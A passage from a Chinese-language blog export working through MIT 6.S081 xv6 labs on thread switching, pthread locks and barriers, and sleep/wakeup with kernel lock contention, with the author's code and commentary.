memory</span></span><br><span class="line">  <span class="comment">// references happen strictly after the lock is acquired.</span></span><br><span class="line">  <span class="comment">// On RISC-V, this emits a fence instruction.</span></span><br><span class="line">  __sync_synchronize();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Record info about lock acquisition for holding() and debugging.</span></span><br><span class="line">  lk-&gt;cpu = <span class="built_in">mycpu</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">release</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">holding</span>(lk))</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;release&quot;</span>);</span><br><span class="line"></span><br><span class="line">  lk-&gt;cpu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell the C compiler and the CPU to not move loads or stores</span></span><br><span class="line">  <span class="comment">// past this point, to ensure that all the stores in the critical</span></span><br><span class="line">  <span class="comment">// section are visible to other CPUs before the lock is released,</span></span><br><span class="line">  <span class="comment">// and that loads in the critical section occur strictly before</span></span><br><span class="line">  <span class="comment">// the lock is released.</span></span><br><span class="line">  <span class="comment">// On RISC-V, this emits a fence instruction.</span></span><br><span class="line">  __sync_synchronize();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Release the lock, equivalent to lk-&gt;locked = 0.</span></span><br><span class="line">  <span class="comment">// This code doesn&#x27;t use a C assignment, since the C standard</span></span><br><span class="line">  <span class="comment">// implies that an assignment might be implemented with</span></span><br><span class="line">  <span class="comment">// multiple store instructions.</span></span><br><span class="line">  <span class="comment">// On RISC-V, sync_lock_release turns into an atomic swap:</span></span><br><span class="line">  <span class="comment">//   s1 = &amp;lk-&gt;locked</span></span><br><span class="line">  <span class="comment">//   amoswap.w zero, zero, (s1)</span></span><br><span class="line">  __sync_lock_release(&amp;lk-&gt;locked);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pop_off</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check whether this cpu is holding the lock.</span></span><br><span class="line"><span class="comment">// Interrupts must be off.</span></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">holding</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line">  r = (lk-&gt;locked &amp;&amp; lk-&gt;cpu == <span class="built_in">mycpu</span>());</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// push_off/pop_off are like intr_off()/intr_on() except that they are matched:</span></span><br><span class="line"><span class="comment">// it takes two pop_off()s to undo two push_off()s.  Also, if interrupts</span></span><br><span class="line"><span class="comment">// are initially off, then push_off, pop_off leaves them off.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">push_off</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> old = <span class="built_in">intr_get</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">intr_off</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">mycpu</span>()-&gt;noff == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">mycpu</span>()-&gt;intena = old;</span><br><span class="line">  <span class="built_in">mycpu</span>()-&gt;noff += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">pop_off</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">cpu</span> *c = <span class="built_in">mycpu</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">intr_get</span>())</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;pop_off - interruptible&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(c-&gt;noff &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;pop_off&quot;</span>);</span><br><span class="line">  c-&gt;noff -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(c-&gt;noff == <span class="number">0</span> &amp;&amp; c-&gt;intena)</span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>线程的切换：在XV6中，任何时候都需要经历：</p>
</li>
</ul>
<ol>
<li>从一个用户进程切换到另一个用户进程，都需要从第一个用户进程接入到内核中，保存<br>用户进程的状态并运行第一个用户进程的内核线程。</li>
<li>再从第一个用户进程的内核线程切换到第二个用户进程的内核线程。</li>
<li>之后，第二个用户进程的内核线程暂停自己，并恢复第二个用户进程的用户寄存器。</li>
<li>最后返回到第二个用户进程继续执行。<br><img src="https://i.loli.net/2021/10/09/OuJrW8gPRQfx9nU.png"></li>
</ol>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>本次<code>lab</code>的几个程序倒是非常简单.<br><a href="https://github.com/mike-box/MIT6.S081/tree/main/lab-cow-handin">git repo</a></p>
<h2 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your job is to come up with a plan to create threads and save/restore registers to switch between threads, and implement that plan. When you&#x27;re done, make grade should say that your solution passes the uthread test.</span><br></pre></td></tr></table></figure>
<p>实现几个基本线程的切换：上下文切换这部分最难，但是我们可以直接可以参考<code>switch.S</code>的实现，直接<code>copy</code>过来即可.关于线程切换时．每个线程都有独立的栈，我们在初始化线程时，会将线程的上下文中<code>sp</code>和<code>ra</code>进行初始化,分别指向当前线程的栈的高位地址,返回地址则指向线程的起始函数地址.</p>
<ul>
<li>最坑的一个<code>bug</code>是: 线程的栈的地址是从高地址向低地址增长,刚开始没有发现这个问题,直接将低地址赋给$sp$,然后总是出错.莫名奇妙的会改写线程的状态,总是找不到原因,最终查看,由于栈的地址是从高往低增长,我们在对栈进行操作时会覆盖掉$thread$结构体中的其他信息和内容.</li>
<li>关于线程的定义:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">context</span> &#123;</span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">thread</span> &#123;</span><br><span class="line">  <span class="type">char</span>       stack[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="type">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">context</span> context;       <span class="comment">/* thread context */</span>	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><strong>thread_switch</strong>定义：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* YOUR CODE HERE */</span></span><br><span class="line">	sd ra, <span class="number">0</span>(a0)</span><br><span class="line">    sd sp, <span class="number">8</span>(a0)</span><br><span class="line">    sd s0, <span class="number">16</span>(a0)</span><br><span class="line">    sd s1, <span class="number">24</span>(a0)</span><br><span class="line">    sd s2, <span class="number">32</span>(a0)</span><br><span class="line">    sd s3, <span class="number">40</span>(a0)</span><br><span class="line">    sd s4, <span class="number">48</span>(a0)</span><br><span class="line">    sd s5, <span class="number">56</span>(a0)</span><br><span class="line">    sd s6, <span class="number">64</span>(a0)</span><br><span class="line">    sd s7, <span class="number">72</span>(a0)</span><br><span class="line">    sd s8, <span class="number">80</span>(a0)</span><br><span class="line">    sd s9, <span class="number">88</span>(a0)</span><br><span class="line">    sd s10, <span class="number">96</span>(a0)</span><br><span class="line">    sd s11, <span class="number">104</span>(a0)</span><br><span class="line"></span><br><span class="line">    ld ra, <span class="number">0</span>(a1)</span><br><span class="line">    ld sp, <span class="number">8</span>(a1)</span><br><span class="line">    ld s0, <span class="number">16</span>(a1)</span><br><span class="line">    ld s1, <span class="number">24</span>(a1)</span><br><span class="line">    ld s2, <span class="number">32</span>(a1)</span><br><span class="line">    ld s3, <span class="number">40</span>(a1)</span><br><span class="line">    ld s4, <span class="number">48</span>(a1)</span><br><span class="line">    ld s5, <span class="number">56</span>(a1)</span><br><span class="line">    ld s6, <span class="number">64</span>(a1)</span><br><span class="line">    ld s7, <span class="number">72</span>(a1)</span><br><span class="line">    ld s8, <span class="number">80</span>(a1)</span><br><span class="line">    ld s9, <span class="number">88</span>(a1)</span><br><span class="line">    ld s10, <span class="number">96</span>(a1)</span><br><span class="line">    ld s11, <span class="number">104</span>(a1)</span><br><span class="line">    </span><br><span class="line">	ret    <span class="comment">/* return to ra */</span></span><br></pre></td></tr></table></figure></li>
<li>线程初始化：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="type">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">thread</span> *t;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;t-&gt;context,<span class="number">0</span>,<span class="built_in">sizeof</span>(<span class="keyword">struct</span> context));</span><br><span class="line">  t-&gt;context.ra = (uint64)func;</span><br><span class="line">  t-&gt;context.sp = (uint64)t-&gt;stack + STACK_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>线程调度与切换:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_schedule</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">thread</span> *t, *next_thread;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Find another runnable thread. */</span></span><br><span class="line">  next_thread = <span class="number">0</span>;</span><br><span class="line">  t = current_thread + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREAD; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(t &gt;= all_thread + MAX_THREAD)</span><br><span class="line">      t = all_thread;</span><br><span class="line">    <span class="keyword">if</span>(t-&gt;state == RUNNABLE) &#123;</span><br><span class="line">      next_thread = t;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t = t + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next_thread == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread_schedule: no runnable threads\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">thread_switch</span>((uint64)&amp;t-&gt;context,(uint64)&amp;next_thread-&gt;context);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">     next_thread = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this assignment you will explore parallel programming with threads and locks using a hash table. You should do this assignment on a real Linux or MacOS computer (not xv6, not qemu) that has multiple cores. Most recent laptops have multicore processors.</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在多线程下,多个线程同时更新和查找<code>hash table</code>,会出现数据竞争的问题,如何去解决该问题?很明显就是加锁，在更新<code>hash table</code>时加锁,防止两个线程同时更新<code>hash tbale</code>即可.</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i = key % NBUCKET;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// is the key already present?</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">entry</span> *e = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (e = table[i]; e != <span class="number">0</span>; e = e-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">pthread_mutex_lock</span>(&amp;lock);</span><br><span class="line">  <span class="keyword">if</span>(e)&#123;</span><br><span class="line">    <span class="comment">// update the existing key.</span></span><br><span class="line">    e-&gt;value = value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// the new is new.</span></span><br><span class="line">    <span class="built_in">insert</span>(key, value, &amp;table[i], table[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">pthread_mutex_unlock</span>(&amp;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this assignment you&#x27;ll implement a barrier: a point in an application at which all participating threads must wait until all other participating threads reach that point too. You&#x27;ll use pthread condition variables, which are a sequence coordination technique similar to xv6&#x27;s sleep and wakeup.</span><br></pre></td></tr></table></figure>
<ul>
<li><p>题目中用了多个线程的同步,实际上利用了条件变量<code>cond</code>,这个与<code>C++</code>中的条件变量实现原理类似<code>condition_variable</code>, 可以参考<code>pthread_cond_wait</code>与<code>pthread_cond_timedwait</code>的用法.<a href="https://baike.baidu.com/item/pthread_cond_wait/3011997?fr=aladdin">cond</a></p>
</li>
<li><ul>
<li>阻塞功能: 必须和一个互斥锁配合，以防止多个线程同时请求<code>pthread_cond_wait()</code>（或<code>pthread_cond_timedwait()</code>，下同）的竞争条件（<code>Race Condition</code>）。<code>mutex</code>互斥锁必须是普通锁（<code>PTHREAD_MUTEX_TIMED_NP</code>）或者适应锁（<code>PTHREAD_MUTEX_ADAPTIVE_NP</code>），且在调用pthread_cond_wait()前必须由本线程加锁（<code>pthread_mutex_lock()</code>），而在更新条件等待队列以前，<code>mutex</code>保持锁定状态，并在线程挂起进入等待前解锁。在条件满足从而离开<code>pthread_cond_wait()</code>之前，<code>mutex</code>将被重新加锁，以与进入<code>pthread_cond_wait()</code>前的加锁动作对应。阻塞时处于解锁状态。</li>
</ul>
</li>
<li><ul>
<li>pthread_cond_wait进入阻塞时,则会释放锁,从而别的线程可以获取到该锁;当<code>pthread_cond_wait</code>被唤醒时,则又会加锁,因此当它唤醒后,还需要释放锁的操作.</li>
</ul>
</li>
<li><ul>
<li>在条件满足从而离开pthread_cond_wait()之前，mutex将被重新加锁，以与进入pthread_cond_wait()前的加锁动作对应</li>
</ul>
</li>
<li><ul>
<li>激活功能: 激发条件有两种形式，<code>pthread_cond_signal()</code>激活一个等待该条件的线程，存在多个等待线程时按入队顺序激活其中一个；而<code>pthread_cond_broadcast()</code>则激活所有等待线程。</li>
</ul>
</li>
<li><p>重要函数的使用说明:　使用<code>pthread_mutex_lock(&amp;mutex1)</code>;加互斥所，然后在<code>pthread_cond_wait(&amp;cond, &amp;mutex1)</code>;这样可以保证这期间没有<code>pthread_cond_broadcast</code>或者<code>pthread_cond_signal</code>操作，从而保证条件不会丢失，当<code>pthread_cond_wait(&amp;cond, &amp;mutex1)</code>;</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pthread_cond_wait</span>(&amp;cond, &amp;mutex);  <span class="comment">// go to sleep on cond, releasing lock mutex, acquiring upon wake up</span></span><br><span class="line"><span class="built_in">pthread_cond_broadcast</span>(&amp;cond);     <span class="comment">// wake up every thread sleeping on cond</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="type">void</span> **retval)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> </span></span><br><span class="line"><span class="function"><span class="title">barrier</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Block until all threads have called barrier() and</span></span><br><span class="line">  <span class="comment">// then increment bstate.round.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">　<span class="comment">// acquire mutex</span></span><br><span class="line">  <span class="built_in">pthread_mutex_lock</span>(&amp;bstate.barrier_mutex);</span><br><span class="line">  bstate.nthread++;</span><br><span class="line">  <span class="keyword">if</span>(bstate.nthread == nthread)&#123;</span><br><span class="line">  	bstate.round += <span class="number">1</span>;</span><br><span class="line">  	bstate.nthread = <span class="number">0</span>;</span><br><span class="line">  	<span class="built_in">pthread_cond_broadcast</span>(&amp;bstate.barrier_cond);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	<span class="built_in">pthread_cond_wait</span>(&amp;bstate.barrier_cond,&amp;bstate.barrier_mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">pthread_mutex_unlock</span>(&amp;bstate.barrier_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul>
<li>通过这一章几个重要的原理讲解,非常清晰的了解操作系统进程调度的第层实现原理与锁的实现原理.</li>
<li>通过学习<code>pthread_cond_wait</code>的原理从而能够学习<code>c++</code>中<code>conditional_variable</code>的原理.</li>
<li>下一步计划:</li>
<li><ul>
<li>完成<code>option chanllenge</code>的<code>project</code>;</li>
</ul>
</li>
<li><ul>
<li>学习<code>conditional_variable</code>的实现原理;</li>
</ul>
</li>
<li><ul>
<li>阅读<code>pthread_cond_wait</code>的源代码.</li>
</ul>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab8 lock</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/53/</url>
    <content><![CDATA[<h1 id="lock"><a href="#lock" class="headerlink" title="lock"></a>lock</h1><p>感觉<code>lock lab</code>是自我感觉还算是比较难的<code>lab</code>了, 第二个练习想了很久才想到如何写出正确的代码,特别是中间又莫名出现了 <code>panic: freeing free blocks</code>, 找了很长时间都没有找到问题所在, 还好的是最终解决该问题, 将文件系统 <code>fs</code> 删除后就莫名奇妙好了, 所有的 <code>testcase</code> 全部都可以通过了, 后面需要继续研究一下 <code>lock free</code> 队列的实现.</p>
<ul>
<li>本章终点讲述操作系统中 <code>sleep</code> 和 <code>wakeup</code> 的实现原理, 感觉还是挺有趣的实现, 当然本质上 <code>sleep</code>的实现原理非常简单, 即将当前线程设置为<code>sleeping</code>状态, 并标记当前线程的 $chan$, 然后将当前线程切换出去, 线程调度程序在运行时,发现当前线程的状态不是 <code>runable</code>时就不会将该线程调度到 <code>cpu</code> 核心上, 从而实现了该线程的睡眠.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">sleep</span><span class="params">(<span class="type">void</span> *chan, <span class="keyword">struct</span> spinlock *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Must acquire p-&gt;lock in order to</span></span><br><span class="line">  <span class="comment">// change p-&gt;state and then call sched.</span></span><br><span class="line">  <span class="comment">// Once we hold p-&gt;lock, we can be</span></span><br><span class="line">  <span class="comment">// guaranteed that we won&#x27;t miss any wakeup</span></span><br><span class="line">  <span class="comment">// (wakeup locks p-&gt;lock),</span></span><br><span class="line">  <span class="comment">// so it&#x27;s okay to release lk.</span></span><br><span class="line">  <span class="keyword">if</span>(lk != &amp;p-&gt;lock)&#123;  <span class="comment">//DOC: sleeplock0</span></span><br><span class="line">    <span class="built_in">acquire</span>(&amp;p-&gt;lock);  <span class="comment">//DOC: sleeplock1</span></span><br><span class="line">    <span class="built_in">release</span>(lk);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Go to sleep.</span></span><br><span class="line">  p-&gt;chan = chan;</span><br><span class="line">  p-&gt;state = SLEEPING;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sched</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tidy up.</span></span><br><span class="line">  p-&gt;chan = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reacquire original lock.</span></span><br><span class="line">  <span class="keyword">if</span>(lk != &amp;p-&gt;lock)&#123;</span><br><span class="line">    <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">    <span class="built_in">acquire</span>(lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>我们同时也可以观察一下系统调用程序中 <code>sleep</code> 函数的实现, 原理实际上也是调用 <code>sleep lock</code>来实现, 当前如果等待的时间小于 <code>sleep</code> 睡眠的时间,如果当前进程被唤醒，则继续执行 <code>sleep</code>, 否则则释放 <code>ticklocks</code>,　此时进行就可以从调度程序中被唤醒. <code>sleep</code> 系统调用都是标记在<code>ticks</code>中，我们可以看到时间中断中，每次会将标记为<code>ticks</code>的进程进行唤醒，从而实现时间计数．<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sleep</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  uint ticks0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argint</span>(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;tickslock);</span><br><span class="line">  ticks0 = ticks;</span><br><span class="line">  <span class="keyword">while</span>(ticks - ticks0 &lt; n)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">myproc</span>()-&gt;killed)&#123;</span><br><span class="line">      <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sleep</span>(&amp;ticks, &amp;tickslock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">clockintr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;tickslock);</span><br><span class="line">  ticks++;</span><br><span class="line">  <span class="built_in">wakeup</span>(&amp;ticks);</span><br><span class="line">  <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>关于<code>wake</code>的原理实现也非常简单,即将进程的状态由<code>sleeping</code>设置为 <code>runable</code>即可, 此时在进行进程调度时,该进程即可就唤醒,加载到 <code>CPU</code>核心中运行.<code>wakeup</code>时需要传入 <code>chan</code> 参数标记.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup</span><span class="params">(<span class="type">void</span> *chan)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="built_in">acquire</span>(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state == SLEEPING &amp;&amp; p-&gt;chan == chan) &#123;</span><br><span class="line">      p-&gt;state = RUNNABLE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>lecture</code>中还提到了<code>lost wakeup</code>的问题, 很多细节问题真心值得深入的去思考这些细节实现. 还是认真的学习视频感觉比较.</li>
<li>本章的<code>lab</code>主要以如何减少<code>lock</code>冲突的出发点去优化代码, 同时如何避免死锁的问题去寻求解决办法, 总的来说还算是比较有意思的<code>lab</code>.</li>
</ul>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>本次<code>lab</code>的几个程序倒是感觉不是太难，实现代码倒是不多，但是很多值得思考的地方,整个<a href="https://github.com/mike-box/MIT6.S081/tree/main/">MIT 6.S081</a>的课程总结全部放到github上了.<br><a href="https://github.com/mike-box/MIT6.S081/tree/main/lab-lock-handin">git repo</a></p>
<h2 id="Memory-allocator"><a href="#Memory-allocator" class="headerlink" title="Memory allocator"></a>Memory allocator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The program user/kalloctest stresses xv6&#x27;s memory allocator: three processes grow and shrink their address spaces, resulting in many calls to kalloc and kfree. kalloc and kfree obtain kmem.lock. kalloctest prints (as &quot;#fetch-and-add&quot;) the number of loop iterations in acquire due to attempts to acquire a lock that another core already holds, for the kmem lock and a few other locks. The number of loop iterations in acquire is a rough measure of lock contention. The output of kalloctest looks similar to this before you complete the lab:</span><br><span class="line"></span><br><span class="line">$ kalloctest</span><br><span class="line">start test1</span><br><span class="line">test1 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: kmem: #fetch-and-add 83375 #acquire() 433015</span><br><span class="line">lock: bcache: #fetch-and-add 0 #acquire() 1260</span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: kmem: #fetch-and-add 83375 #acquire() 433015</span><br><span class="line">lock: proc: #fetch-and-add 23737 #acquire() 130718</span><br><span class="line">lock: virtio_disk: #fetch-and-add 11159 #acquire() 114</span><br><span class="line">lock: proc: #fetch-and-add 5937 #acquire() 130786</span><br><span class="line">lock: proc: #fetch-and-add 4080 #acquire() 130786</span><br><span class="line">tot= 83375</span><br><span class="line">test1 FAIL</span><br><span class="line">acquire maintains, for each lock, the count of calls to acquire for that lock, and the number of times the loop in acquire tried but failed to set the lock. kalloctest calls a system call that causes the kernel to print those counts for the kmem and bcache locks (which are the focus of this lab) and for the 5 most contended locks. If there is lock contention the number of acquire loop iterations will be large. The system call returns the sum of the number of loop iterations for the kmem and 